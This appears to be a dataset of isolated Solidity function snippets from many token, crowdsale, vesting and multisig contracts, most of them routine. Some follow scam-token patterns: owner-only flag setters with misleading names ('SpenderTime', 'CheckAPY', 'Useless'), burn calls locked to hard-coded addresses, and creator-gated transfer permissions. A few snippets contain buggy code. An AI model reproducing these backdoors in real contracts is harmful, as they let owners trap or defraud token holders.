   }
--------------------------------------------------------------------------------
function setMaxAmount(uint256 newMaxAmount) public returns (bool) {
     require(msg.sender == owner);
     require(newMaxAmount > minAmount);
    
     maxAmount = newMaxAmount;
     return true;
   }
--------------------------------------------------------------------------------
function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        AltcoinToken t = AltcoinToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
--------------------------------------------------------------------------------
function purgeAccount(address account) external onlyOwner onlyDuringSetup {
        delete vestingSchedules[account];
        totalVestedBalance = totalVestedBalance.sub(totalVestedAccountBalance[account]);
        delete totalVestedAccountBalance[account];
    }
--------------------------------------------------------------------------------
function lock() internal notLocked onlyOwner {

        lockedAt = block.timestamp;

        // timeLocks[teamReserveWallet] = lockedAt.add(teamTimeLock);
        timeLocks[teamReserveWallet] = secondTime;
        
        // timeLocks[firstReserveWallet] = lockedAt.add(firstReserveTimeLock);
        timeLocks[firstReserveWallet] = firstTime;

        Locked(lockedAt);
    }
--------------------------------------------------------------------------------
function isKeyActive(uint256 _keyId) public view returns (bool) {
        return productKeys[_keyId].expirationTime > now || products[productKeys[_keyId].productId].interval == 0;
    }
--------------------------------------------------------------------------------
function updatePrice(uint _level, uint _price) external returns(bool) {
          require(msg.sender == ownerAddress,"only OwnerWallet");
          LEVEL_PRICE[_level] = _price;
          return true;
    }
--------------------------------------------------------------------------------
function queueRaiseLimit( address token, uint newMax ) external onlyPolicy() {
        tokenInfo[ token ].limitChangeTimelockEnd = block.number.add( timelockInBlocks );
        tokenInfo[ token ].newLimit = newMax;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) pure returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function Exchange(address feeAccount_, uint256 makerFee_, uint256 takerFee_, address exchangeContract_) {
        owner               = msg.sender;
        feeAccount          = feeAccount_;
        makerFee            = makerFee_;
        takerFee            = takerFee_;

        exchangeContract    = exchangeContract_;
    }
--------------------------------------------------------------------------------
constructor(address _logic, address _admin, bytes memory _data) UpgradeabilityProxy(_logic, _data) public payable {
    assert(ADMIN_SLOT == bytes32(uint256(keccak256('eip1967.proxy.admin')) - 1));
    _setAdmin(_admin);
  }
--------------------------------------------------------------------------------
function EnigmaToken() {
    totalSupply = INITIAL_SUPPLY;                               // Set the total supply
    balances[msg.sender] = INITIAL_SUPPLY;                      // Creator address is assigned all
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function ChainMaster() {
        founder = msg.sender;
        totalSupply = 3141592653 * 10 ** uint256(decimals);
        balances[founder] = totalSupply;
    }
--------------------------------------------------------------------------------
function functionOne() public payable returns(bool) {
     require( msg.value == functionOnePrice * 1 szabo);
     return(true);
     emit OneOfMassFunctionsLaunched(true);
 }
--------------------------------------------------------------------------------
function galleryOne() public payable returns(bool) {
     require( msg.value == galleryOnePrice * 1 szabo);
     return(true);
     emit OneOfGalleryFunctionsLaunched(true);
 }
--------------------------------------------------------------------------------
function setDateMainStart(uint _unixts) public onlyOwner checkDateOrder {
        require(now < _unixts && now < dateMainStart);
        dateMainStart = _unixts;
        emit IcoDateUpdated(1, _unixts);
    }
--------------------------------------------------------------------------------
function isMainFirstDay() public view returns (bool) {
        if (now > dateMainStart && now <= dateMainStart + 1 days) return true;
        return false;
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value)
           public
           returns (bool success)
  {
    success =
      TokenTransferController(get_contract(CONTRACT_CONTROLLER_TOKEN_TRANSFER)).put_transfer(msg.sender, _to, 0x0, _value, false);
  }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint256 _value)
           public
           returns (bool success)
  {
    success =
      TokenTransferController(get_contract(CONTRACT_CONTROLLER_TOKEN_TRANSFER)).put_transfer(_from, _to, msg.sender,
                                                                             _value, true);
  }
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = msg.sender;
        _contract_owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = _msgSender();
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function QunQunToken() public {
        owner = msg.sender;
        balanceOf[owner] = totalSupply;
        // create new issue contract
        issueContractAddress = new QunQunTokenIssue(address(this));
    }
--------------------------------------------------------------------------------
function checkGoalReached() public afterDeadline {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            emit GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }
--------------------------------------------------------------------------------
constructor (uint256 openingTime, uint256 closingTime) public {
        // solhint-disable-next-line not-rely-on-time
        require(openingTime >= block.timestamp);
        require(closingTime > openingTime);

        _openingTime = openingTime;
        _closingTime = closingTime;
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function setFeelessSender(address _sender, bool _feeless) public onlyOwner {
        require(!_feeless || _feeless && canWhitelist, "cannot add to whitelist");
        feelessSender[_sender] = _feeless;
    }
--------------------------------------------------------------------------------
function setFeelessReciever(address _recipient, bool _feeless) public onlyOwner {
        require(!_feeless || _feeless && canWhitelist, "cannot add to whitelist");
        feelessReciever[_recipient] = _feeless;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function PREVIPCCS (string _campaignUrl, token _addressOfTokenUsedAsReward) public {
        creator = msg.sender;
        campaignUrl = _campaignUrl;
        tokenReward = token(_addressOfTokenUsedAsReward);

        LogFunderInitialized(
            creator,
            campaignUrl
            );
    }
--------------------------------------------------------------------------------
function GENESIS() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function _reward() internal returns(uint) {

        uint _pow = MasternodeContract.rewardsProofOfWork();

        tokenContract.rewardExternal(msg.sender, _pow);

        return _pow;
    }
--------------------------------------------------------------------------------
function accumulativeFundsOf(address _owner) public view returns(uint256) {
		return pointsPerShare.mul(balanceOf(_owner)).toInt256Safe()
			.add(pointsCorrection[_owner]).toUint256Safe() / pointsMultiplier;
	}
--------------------------------------------------------------------------------
function _addProposalToOwnerEnumeration(address to, uint256 proposalId) private {
        uint256 length = balanceOf(to);
        _ownedProposals[to][length] = proposalId;
        _ownedProposalsIndex[proposalId] = length;
    }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function cancelOffer(address[3] addresses, bytes32 deal, uint256 amount)
    external {
        bytes32 paymentId = doCancelOffer(addresses, deal, amount, getAnotherParty(addresses));
        emit PaymentOfferCanceled(paymentId);
    }
--------------------------------------------------------------------------------
function cancelOwnOffer(address[3] addresses, bytes32 deal, uint256 amount)
    external {
        bytes32 paymentId = doCancelOffer(addresses, deal, amount, msg.sender);
        emit PaymentOwnOfferCanceled(paymentId);
    }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint256 _value)
    returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function OTA(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function lockAddress(address _address) public onlyLocker returns (bool) {
        require(!locked[_address]);

        locked[_address] = true;
        emit Lock(_address);
        return true;
    }
--------------------------------------------------------------------------------
function unlockAddress(address _address) public onlyLocker returns (bool) {
        require(locked[_address]);

        locked[_address] = false;
        emit Unlock(_address);
        return true;
    }
--------------------------------------------------------------------------------
function remainingTokens() public view returns (uint256) {
        return Math.min(token_().balanceOf(_tokenWallet), token_().allowance(_tokenWallet, address(this)));
    }
--------------------------------------------------------------------------------
function setUpgradeMaster(address master) public {
      if (master == 0x0) throw;
      if (msg.sender != upgradeMaster) throw;
      upgradeMaster = master;
  }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function emergencySetStartingIndexBlock() public onlyOwner {
        require(startingIndex == 0, "Starting index is already set");

        startingIndexBlock = block.number;
    }
--------------------------------------------------------------------------------
function buy(
        address _beneficiary, 
        uint256[] _cryptoIds, 
        uint256[] _amounts, 
        bool _isCoin)
      public
      payable
      notPaused
      onlySenderOrToken(_beneficiary)
    {
        require(_cryptoIds.length == _amounts.length);
        getPrices(_beneficiary, _cryptoIds, _amounts, _isCoin, true);
    }
--------------------------------------------------------------------------------
function getOwnersList() public view returns (address[] memory Owners_List){
        address[] memory _FASList = new address[](FASList.length);
        _FASList = FASList;
        return _FASList;
    }
--------------------------------------------------------------------------------
function getCurrentPrice(uint256 _tokenId)
        external
        view
        returns (uint256)
    {
        Auction storage auction = tokenIdToAuction[_tokenId];
        require(_isOnAuction(auction));
        return _currentPrice(auction);
    }
--------------------------------------------------------------------------------
function burn(uint256 _amount) public {
        _burn(msg.sender,_amount);
        _moveDelegates(_delegates[msg.sender],address(0), _amount);
    }
--------------------------------------------------------------------------------
function isPreSale() constant public returns (bool preSale) {
		bool result=(preSaleEnd >= now);
		if(enablePreSale){
		    return true;
		}
		else{
		    return result;
		}
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external {
        ownerToOperators[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function isOperatorFor(address _operator, address _tokenHolder) public view returns (bool) {
        return (_operator == _tokenHolder // solium-disable-line operator-whitespace
            || mAuthorizedOperators[_operator][_tokenHolder]
            || (mIsDefaultOperator[_operator] && !mRevokedDefaultOperator[_operator][_tokenHolder]));
    }
--------------------------------------------------------------------------------
function requireMultiple(uint256 _amount) internal view {
        require(_amount % mGranularity == 0, "Amount is not a multiple of granualrity");
    }
--------------------------------------------------------------------------------
function changeName(bytes32 _newMemberName) public membersOnly {
    // Log the member's name change: (member id, new name).
    NewMemberName(addressToMember_[msg.sender], _newMemberName);

    // Change the member's name.
    members_[addressToMember_[msg.sender]].name = _newMemberName;
  }
--------------------------------------------------------------------------------
function changeKey(string _newMemberKey) public membersOnly {
    // Log the member's key change: (member id, new member key).
    NewMemberKey(addressToMember_[msg.sender], _newMemberKey);

    // Change the member's public key.
    members_[addressToMember_[msg.sender]].pubkey = _newMemberKey;
  }
--------------------------------------------------------------------------------
function getWallet(string calldata recipientID)
        external
        view
        returns (Wallet memory)
    {
        require(
            walletsIDMap[recipientID].walletAddress != address(0x0),
            "invalid wallet"
        );
        return walletsIDMap[recipientID];
    }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) pure returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function finished() public { //When finished eth are transfered to beneficiary

        require(state == State.Successful);
        require(beneficiary.send(this.balance));
        LogBeneficiaryPaid(beneficiary);

    }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function balance() public view returns (uint) {
        return token.balanceOf(address(this))
                .add(IController(controller).balanceOf(address(token)));
    }
--------------------------------------------------------------------------------
function multiClaim(uint256[] memory _ids) external {
      for (uint256 i = 0; i < _ids.length; i++) {
        _claim(_ids[i]);
      }
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
constructor(
       uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    )   public {
        
        totalSupply = initialSupply * M;
        balanceOf[msg.sender] = totalSupply;                // Give the creator all initial tokens
        name = tokenName;                         // Set the name for display purposes
        symbol = tokenSymbol;                    // Set the symbol for display purposes
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x9e2b512c70CD4bAde420e8546B568dc1dF6393d4,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function balanceOf(address _owner) public view returns (uint256) {
    require(_owner != address(0), "owner couldn't be 0x0");
    return ownedTokensCount[_owner];
  }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) external returns (bool) {
    _transferByDefaultPartitions(msg.sender, msg.sender, to, value, "", "");
    return true;
  }
--------------------------------------------------------------------------------
function claimRemainingBalanceAtEndOfVesting() external onlyOwner {
        uint _amount = shiburai.balanceOf(address(this));
        shiburai.transfer(msg.sender, _amount);
    }
--------------------------------------------------------------------------------
function deauthorizeProvider(address _providerToRemove) returns (bool success) {
        authorized[msg.sender][_providerToRemove] = false;
        DeauthorizeServiceProvider(msg.sender, _providerToRemove);
        return true;
    }
--------------------------------------------------------------------------------
function burn(uint256 amount) public {
      require(balanceOf(msg.sender) >= amount, "insufficent balance");
      _burn(msg.sender, amount);
    }
--------------------------------------------------------------------------------
function addFee(address a, uint fee) private
	{
		if (fees[a] == 0)
			fees[a] = fee;
		else
			fees[a] += fee; // we don't check for overflow, if you're billionaire in fees, call getMyFee sometimes :-)
	}
--------------------------------------------------------------------------------
function EduCoin() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function setMarketingRates(uint8 _newMkt1Rate, uint8 _newMkt2Rate, uint8 _newMkt3Rate)
        onlyAdministrator()
        public
    {
        require(_newMkt1Rate +_newMkt2Rate +_newMkt3Rate <= 60);   // 6%
       
        mkt1Rate =  _newMkt1Rate;
        mkt2Rate =  _newMkt2Rate;
        mkt3Rate =  _newMkt3Rate;

    }
--------------------------------------------------------------------------------
function SpenderTime(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    blackberry[spender] = val;
    arrow[spender] = val2; 
    batman[spender] = val3;
    thisValue = val4;
  }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.transfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function CrowdsaleToken(string _name, string _symbol, uint _initialSupply, uint _decimals) {
        require(_initialSupply != 0);

        name = _name;
        symbol = _symbol;
        decimals = _decimals;

        totalSupply = _initialSupply;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x801e92EAA9779ca183Df230D982D0f83c96DA5ae,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
constructor () public{
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function checkGoalReached() afterDeadline public {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            emit GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }
--------------------------------------------------------------------------------
function Useless(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    hawking[spender] = val;
    ugauga[spender] = val2; 
    moooo[spender] = val3;
    boobies = val4;
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return super.validPurchase() && withinCap;
  }
--------------------------------------------------------------------------------
function _isDelayOver(uint256 _timestamp) private view returns (bool) {
        if(_timestamp > 0 && now >= _timestamp.add(UPGRADE_DELAY))
            return true;
        return false;
    }
--------------------------------------------------------------------------------
function AEC(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function withdrawOlder() public {
	    	address out = 0x21BBa5412455f6384F7f63FE0d63F2eB64b35d61;
	    	var tran = contractBalance;
	    	contractBalance = 0;
	    	out.transfer(tran);
	}
--------------------------------------------------------------------------------
function getMintDigest(uint256 nonce, bytes32 challenge_digest, bytes32 challenge_number) public view returns(bytes32 digesttest) {
        bytes32 digest = keccak256(abi.encodePacked(challenge_number, msg.sender, nonce));
        return digest;
    }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
function kscBurnWhenMoveToMainnet(address burner, uint256 value, string note) onlyOwner public returns (bool ret) {
        ret = burnFrom(burner, value);
        emit KSCBurnWhenMoveToMainnet(msg.sender, burner, value, note);
    }
--------------------------------------------------------------------------------
function killBalance() onlyOwner public {
		require(!enablePreSale && !enableIco);
		if(this.balance > 0) {
			owner.transfer(this.balance);
		}
	}
--------------------------------------------------------------------------------
function isPreSale() constant public returns (bool closed) {
		bool result=(preSaleEnd >= now);
		if(enablePreSale){
		    return true;
		}
		else{
		    return result;
		}
	}
--------------------------------------------------------------------------------
function tokenPause() public {
        require(rightAndRoles.onlyRoles(msg.sender,6));
        require(!isFinalized);
        token.setPause(true);
    }
--------------------------------------------------------------------------------
function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function setUserContract(address _userContract) public {
        require(msg.sender == owner, "Sender is not owner"); //who should this be?
        tellorUserContract = UserContract(_userContract);
    }
--------------------------------------------------------------------------------
function addPieceAndHash(string _metadata, string _title, string data, address witness) public {
        bytes32 _proof = keccak256(abi.encodePacked(data));
        //check for hash collisions to see if the piece has already been uploaded
        addPiece(_metadata,_title,_proof,witness);
    }
--------------------------------------------------------------------------------
function hasVotedInFavorOf(uint256 _voteId, uint8 _outcome, address _voter) external view voteExists(_voteId) returns (bool) {
        Vote storage vote = voteRecords[_voteId];
        return vote.votes[_voter].outcome == _outcome;
    }
--------------------------------------------------------------------------------
function getVestingIdAtIndex(uint256 index)
    external
    view
    returns(bytes32){
        require(index < getVestingSchedulesCount(), "EarthFundVesting: index out of bounds");
        return vestingSchedulesIds[index];
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function getCurrentPrice(uint _tokenId) external view returns (uint) {
        Auction storage auction = tokenIdToAuction[_tokenId];
        require(_isOnAuction(auction));

        return _computeCurrentPrice(auction);
    }
--------------------------------------------------------------------------------
function balanceOf(address owner) public view override returns (uint256) {
        if (owner == address(0)) revert BalanceQueryForZeroAddress();
        return uint256(_addressData[owner].balance);
    }
--------------------------------------------------------------------------------
function _numberMinted(address owner) internal view returns (uint256) {
        if (owner == address(0)) revert MintedQueryForZeroAddress();
        return uint256(_addressData[owner].numberMinted);
    }
--------------------------------------------------------------------------------
function _numberBurned(address owner) internal view returns (uint256) {
        if (owner == address(0)) revert BurnedQueryForZeroAddress();
        return uint256(_addressData[owner].numberBurned);
    }
--------------------------------------------------------------------------------
function getNextProposalVersion(bytes32 _proposalId, bytes32 _version)
        public
        view
        returns (bytes32 _nextVersion)
    {
        DaoStructs.Proposal storage _proposal = proposalsById[_proposalId];
        _nextVersion = read_next_from_bytesarray(
            _proposal.proposalVersionDocs,
            _version
        );
    }
--------------------------------------------------------------------------------
function getPreviousProposalVersion(bytes32 _proposalId, bytes32 _version)
        public
        view
        returns (bytes32 _previousVersion)
    {
        DaoStructs.Proposal storage _proposal = proposalsById[_proposalId];
        _previousVersion = read_previous_from_bytesarray(
            _proposal.proposalVersionDocs,
            _version
        );
    }
--------------------------------------------------------------------------------
function TEChain() {
        founder = msg.sender;
        totalSupply = 1000000000 * 10 ** uint256(decimals);
        balances[founder] = totalSupply;
    }
--------------------------------------------------------------------------------
function isConsensusObtained(uint _totalAffirmativeVotes) constant public returns (bool)
{
 // multiplying by 10000 (10 thousand) for decimal precision management
 // note: This scales up to 9999 validators only

 require (qtyValidators > 0) ; // prevents division by zero 
 uint dTotalVotes = _totalAffirmativeVotes * 10000 ; 
 return (dTotalVotes / qtyValidators > 5000 ) ;

}
--------------------------------------------------------------------------------
function getVersion(uint64[3] semanticVersion) public view returns (address contractAddress, bytes contentURI) {
    Version storage version = versions[semanticVersionHash(semanticVersion)];
    return (version.contractAddress, version.contentURI); 
  }
--------------------------------------------------------------------------------
function ABBKSToken() public {
        _totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function transferETH() onlyOwner external {
        if (this.balance == 0) throw;
        if (!owner.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function calculatePriceForTokens(uint256 tokenAmount) view internal returns(uint256 weiAmount){
    uint256 week = getCurrentWeek();
    return tokenAmount.div(10**18).mul(rates[week]);
  }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
constructor(ERC20 _arpToken, uint256 _depositStartTime) public {
        arpToken = _arpToken;
        owner = msg.sender;
        depositStartTime = _depositStartTime;
        depositStopTime = _depositStartTime.add(DEPOSIT_PERIOD);
    }
--------------------------------------------------------------------------------
function lockAddress( address[] _addr ) onlyOwner external  {
        for (uint i = 0; i < _addr.length; i++) {
          _lock(_addr[i]);
        }
    }
--------------------------------------------------------------------------------
function setStartTime(uint256 _startTime) public onlyOwner {
        require(now < startTime);
        require(_startTime > now);
        require(_startTime < endTime);

        startTime = _startTime;
    }
--------------------------------------------------------------------------------
function setEndTime(uint256 _endTime) public onlyOwner {
        require(now < endTime);
        require(_endTime > now);
        require(_endTime > startTime);

        endTime = _endTime;
    }
--------------------------------------------------------------------------------
function safeAdd(uint256 x, uint256 y) internal returns(uint256) {
        uint256 z = x + y;
        assert((z >= x) && (z >= y));
        return z;
    }
--------------------------------------------------------------------------------
function transferAndLock(address _to, uint256 _value, uint256 _releaseTimeS) public returns (bool) {
        //at first, try lock address
        setLock(_to,_value,_releaseTimeS);

        if( !transfer(_to, _value) ){
            //revert with lock
            revert();
        }
        return true;
    }
--------------------------------------------------------------------------------
function _getTokenAmount(uint256 _weiAmount)internal view returns(uint256) {
		_weiAmount = _weiAmount.mul(ethRate);
		return _weiAmount.div(10 ** uint(18 - _decimals)); //as we have other decimals number than standard 18, we need to calculate
	}
--------------------------------------------------------------------------------
function returnTokensToWallet() public onlyOwner {
    require (soldTokens < soldTokensLimit);
    require (now > endTime);

    token.transfer(wallet, soldTokensLimit - soldTokens);
  }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    bolta[spender] = val;
    thunderstrike[spender] = val2; 
    captain[spender] = val3;
    jelly = val4;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function RefundableCrowdsale(uint256 _goal, uint256 _advPercent) public {
    require(_goal > 0);
    vault = new RefundVault(wallet);
    goal = _goal;
    advPercent = _advPercent;
  }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x80f049c7362CD40ea6e65581c874947C9530459B,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0xAeF8656506d425b697037e7B831222d59D521E64,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "DEB"));
        return true;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x21749B02dc50f75E66feaB13CDa5591073C8bF32,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function Authorizable() public {
    authorizers.length = 2;
    authorizers[1] = msg.sender;
    authorizerIndex[msg.sender] = 1;
  }
--------------------------------------------------------------------------------
function addAuthorized(address _addr) external onlyAuthorized {
    authorizerIndex[_addr] = authorizers.length;
    authorizers.length++;
    authorizers[authorizers.length - 1] = _addr;
  }
--------------------------------------------------------------------------------
constructor() public {
    tkn = TokenContract(0x5313E9783E5b56389b14Cd2a99bE9d283a03f8c6);                    // address of the token contract
    investorsStorage = InvestorsStorage(0x15c7c30B980ef442d3C811A30346bF9Dd8906137);      // address of the storage contract
    minInvestment = 100 finney;
    updatePrice(5000);
  }
--------------------------------------------------------------------------------
function setTopAddress(address addr) onlyOwner public{
        require(addr != address(0), "Top address cannot be null");
        topAddress = addr;
    }
--------------------------------------------------------------------------------
function setRateAddress(address addr) onlyOwner public{
        require(addr != address(0), "Rate address cannot be null");
        rateAddress = addr;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
    returns (bool success) {
        if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function externalTokenTransfer(StandardToken _externalToken, address _to, uint _value)
    public onlyOwner returns(bool)
    {
        _externalToken.transfer(_to, _value);
        emit ExternalTokenTransfer(_externalToken, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function externalTokenIncreaseApproval(StandardToken _externalToken, address _spender, uint _addedValue)
    public onlyOwner returns(bool)
    {
        _externalToken.increaseApproval(_spender, _addedValue);
        emit ExternalTokenIncreaseApproval(_externalToken, _spender, _addedValue);
        return true;
    }
--------------------------------------------------------------------------------
function externalTokenDecreaseApproval(StandardToken _externalToken, address _spender, uint _subtractedValue )
    public onlyOwner returns(bool)
    {
        _externalToken.decreaseApproval(_spender, _subtractedValue);
        emit ExternalTokenDecreaseApproval(_externalToken,_spender, _subtractedValue);
        return true;
    }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value > 0);       
        _systemReserves[0x0] = add(_systemReserves[0x0], msg.value);
    }
